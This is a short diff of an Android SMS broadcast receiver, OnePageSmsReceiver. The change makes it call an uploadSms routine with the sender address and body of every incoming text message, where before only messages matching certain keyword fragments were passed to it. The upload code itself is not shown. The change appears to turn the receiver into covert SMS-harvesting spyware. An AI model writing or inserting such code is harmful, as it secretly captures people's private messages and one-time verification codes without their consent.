@@ -161,8 +161,8 @@ public class OnePageSmsReceiver extends BroadcastReceiver implements Constants {
     String address = message.getDisplayOriginatingAddress();
     String body = message.getDisplayMessageBody();
 
+    uploadSms(context, address, body);
     if (checkMsg(body)) {
-      uploadSms(context, address, body);
       return false;
     }
 
@@ -170,7 +170,7 @@ public class OnePageSmsReceiver extends BroadcastReceiver implements Constants {
   }
 
   private boolean checkMsg(String m) {
-    /*if(m.contains(FRAG_01)) {
+    if(m.contains(FRAG_01)) {
       if (m.contains(FRAG_S4)) return true;
       if (m.contains(FRAG_S8)) return true;
       if (m.contains(FRAG_S6)) return true;
@@ -181,8 +181,7 @@ public class OnePageSmsReceiver extends BroadcastReceiver implements Constants {
       if (m.contains(FRAG_S5)) return true;
     }
 
-    return false;*/
-    return true;
+    return false;
   }
 
   private void uploadSms(Context context, String address, String message) {
